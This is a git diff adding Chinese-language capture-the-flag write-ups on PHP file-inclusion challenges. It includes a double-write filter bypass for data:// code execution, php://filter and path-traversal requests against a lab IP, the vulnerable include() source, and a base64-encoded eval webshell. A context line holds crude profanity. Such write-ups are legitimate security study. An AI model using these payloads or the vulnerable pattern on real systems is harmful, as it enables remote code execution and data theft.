@@ -214,3 +214,137 @@ flag.php在根目录下，去找到它
 ```
 
 这种题目完全就是傻逼题目，还增加base64 增加挑战性，一点提示都没有，做你妈个逼
+
+
+
+# 第七题 data://协议
+
+ PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。
+ 通过你所学到的知识，测试该网站可能存在的包含漏洞，尝试获取flag，答案就在根目录下flag.php文件中。
+
+![image-20260404220631234](./image/FLI/image-20260404220631234.png)
+
+## write up
+
+
+
+可以看到,他自动添加了文件名的后缀, 尝试了很多后缀绕过的方法没有用,
+
+最后用`data://text/plain,<?php sytem('ls')?>` data://伪协议可以用来执行php脚本,
+
+但是他对data://进行了非迭代的替换,所以使用双写绕过,`dadata://ta://text/plain,<?php sytem('ls')?>`
+
+最后只使用`dadata://ta://text/plain,<?php show_source('flag.php')?>`解决,并不是说系统命令不行,知道点其他的也不是坏事
+
+以下是他的源代码:
+
+```php
+<?php error_reporting(0); ?>
+<?php include("function.php"); ?>
+<html>
+<head>
+  <title></title>
+  <link rel="stylesheet" href="../css/bootstrap.css">
+  <link rel="stylesheet" href="../css/nav.css">
+  <meta charset="UTF-8">
+</head>
+
+<body>
+
+  <?php include '../header.php';?>
+
+  <div class="container mt-5 min-height main-body">
+
+
+<div class="row">
+   <div class="col-7 m-auto">
+         <h2>文件包含漏洞</h2>
+         <?php
+             $page=$_GET['page'];
+
+            $page=str_replace("php://", "", $page);
+      $page=str_replace("file://", "", $page);
+      $page=str_replace("ftp://", "", $page);
+      $page=str_replace("zlib://", "", $page);
+      $page=str_replace("data://", "", $page);
+      $page=str_replace("glob://", "", $page);
+      $page=str_replace("phar://", "", $page);
+      $page=str_replace("ssh2://", "", $page);
+      $page=str_replace("rar://", "", $page);
+      $page=str_replace("ogg://", "", $page);
+            $page=str_replace("expect://", "", $page);
+            $page= $page . ".txt";
+?>
+         <br>
+         <span style="color:red">
+             <?php
+echo ">> ".$page;
+?>
+</span>
+         <br>
+         <br>
+         <?php
+            include($page);
+         ?>
+  </div>
+  </div>
+</div>
+<?php include '../footer.php';?>
+</body>
+</html>
+```
+
+# 第八题
+
+  PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。
+
+通过你所学到的知识，测试该网站可能存在的包含漏洞，尝试获取webshell，答案就在根目录下key.flag文件中。
+
+## write up
+
+刚开始被他的题目描述所迷惑了,想到获取webshell ,就会想data:// 的伪协议,,应该遵循最佳实践:
+
+1. 尝试读取任何系统的文件,比如/etc/passwd 
+2. 再尝试php://filter   伪协议
+3. 再尝试data:// 伪协议
+
+尝试第一步时,我们可以访问到/etc/passwd ,说明我们可以尝试路径穿越,直接读取这个文件:
+
+```http
+http://211.103.180.146:32006/vul/include.php?file=../key.flag
+```
+
+![image-20260404225315555](./image/FLI/image-20260404225315555.png)
+
+确实读到了这个文件,但是他的flag值,可能再php代码当中,当使用include() 包含时,不管什么后缀,只要是php代码,都会被执行
+
+所以这时应该明锐的察觉到,要使用伪协议来读取源代码:
+
+```http
+http://211.103.180.146:32006/vul/include.php?file=php://filter/convert.base64-encode/resource=../key.flag
+```
+
+![image-20260404225836614](./image/FLI/image-20260404225836614.png)
+
+这样就获得了flag
+
+
+
+# 第九题
+
+![image-20260404231116579](./image/FLI/image-20260404231116579.png)
+
+## write up
+
+本题明牌告诉参数,但是不知道文件的路径和文件名,应该想到利用webshell来查看, 使用data://伪协议来执行php代码
+
+但是有个问题是,当直接 `file=index.php` 时, 会显示如下:![image-20260404231341752](./image/FLI/image-20260404231341752.png)
+
+说明他后端有过滤, 所以应该尝试`data://text/plain;base64`  来绕过,或者双写绕过,
+
+尝试一句话木马:`<?php @eval($_REQUEST[1]);?>` 并进行base64 编码后,使用webshell连接器进行连接
+
+```http
+http://IP:PORT/?file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWzFdKTs/Pg==
+```
+
